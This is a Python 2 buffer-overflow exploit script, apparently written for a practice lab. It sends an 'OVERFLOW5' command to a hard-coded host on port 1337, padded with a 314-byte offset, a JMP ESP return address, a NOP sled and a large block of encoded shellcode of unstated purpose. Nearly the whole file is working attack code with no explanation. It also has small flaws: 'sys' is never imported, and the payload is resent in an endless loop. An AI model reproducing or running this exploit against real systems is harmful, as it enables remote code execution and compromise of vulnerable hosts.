#!/usr/bin/python

import socket, time

remoteip="10.10.33.35"
remoteport=1337
offset = "A" * 314
#jmpes 625011AF
eip = "\xaf\x11\x50\x62"
#badchars \x00\x16\x2f\xf4\xfd
esp =  b"\x90" * 32
esp += b"\xfc\xbb\x88\x67\x4e\x93\xeb\x0c\x5e\x56\x31\x1e\xad"
esp += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x74"
esp += b"\x8f\xcc\x93\x84\x50\xb1\x1a\x61\x61\xf1\x79\xe2\xd2"
esp += b"\xc1\x0a\xa6\xde\xaa\x5f\x52\x54\xde\x77\x55\xdd\x55"
esp += b"\xae\x58\xde\xc6\x92\xfb\x5c\x15\xc7\xdb\x5d\xd6\x1a"
esp += b"\x1a\x99\x0b\xd6\x4e\x72\x47\x45\x7e\xf7\x1d\x56\xf5"
esp += b"\x4b\xb3\xde\xea\x1c\xb2\xcf\xbd\x17\xed\xcf\x3c\xfb"
esp += b"\x85\x59\x26\x18\xa3\x10\xdd\xea\x5f\xa3\x37\x23\x9f"
esp += b"\x08\x76\x8b\x52\x50\xbf\x2c\x8d\x27\xc9\x4e\x30\x30"
esp += b"\x0e\x2c\xee\xb5\x94\x96\x65\x6d\x70\x26\xa9\xe8\xf3"
esp += b"\x24\x06\x7e\x5b\x29\x99\x53\xd0\x55\x12\x52\x36\xdc"
esp += b"\x60\x71\x92\x84\x33\x18\x83\x60\x95\x25\xd3\xca\x4a"
esp += b"\x80\x98\xe7\x9f\xb9\xc3\x6f\x53\xf0\xfb\x6f\xfb\x83"
esp += b"\x88\x5d\xa4\x3f\x06\xee\x2d\xe6\xd1\x11\x04\x5e\x4d"
esp += b"\xec\xa7\x9f\x44\x2b\xf3\xcf\xfe\x9a\x7c\x84\xfe\x23"
esp += b"\xa9\x0b\xae\x8b\x02\xec\x1e\x6c\xf3\x84\x74\x63\x2c"
esp += b"\xb4\x77\xa9\x45\x5f\x82\x3a\x60\xad\xa2\x63\x1c\xaf"
esp += b"\xba\x92\x66\x26\x5c\xfe\x88\x6f\xf7\x97\x31\x2a\x83"
esp += b"\x06\xbd\xe0\xee\x09\x35\x07\x0f\xc7\xbe\x62\x03\xb0"
esp += b"\x4e\x39\x79\x17\x50\x97\x15\xfb\xc3\x7c\xe5\x72\xf8"
esp += b"\x2a\xb2\xd3\xce\x22\x56\xce\x69\x9d\x44\x13\xef\xe6"
esp += b"\xcc\xc8\xcc\xe9\xcd\x9d\x69\xce\xdd\x5b\x71\x4a\x89"
esp += b"\x33\x24\x04\x67\xf2\x9e\xe6\xd1\xac\x4d\xa1\xb5\x29"
esp += b"\xbe\x72\xc3\x35\xeb\x04\x2b\x87\x42\x51\x54\x28\x03"
esp += b"\x55\x2d\x54\xb3\x9a\xe4\xdc\xd3\x78\x2c\x29\x7c\x25"
esp += b"\xa5\x90\xe1\xd6\x10\xd6\x1f\x55\x90\xa7\xdb\x45\xd1"
esp += b"\xa2\xa0\xc1\x0a\xdf\xb9\xa7\x2c\x4c\xb9\xed\x2c\x72"
esp += b"\x45\x0e"


buffer = offset + eip + esp

while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW5 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    print "-------------------------"
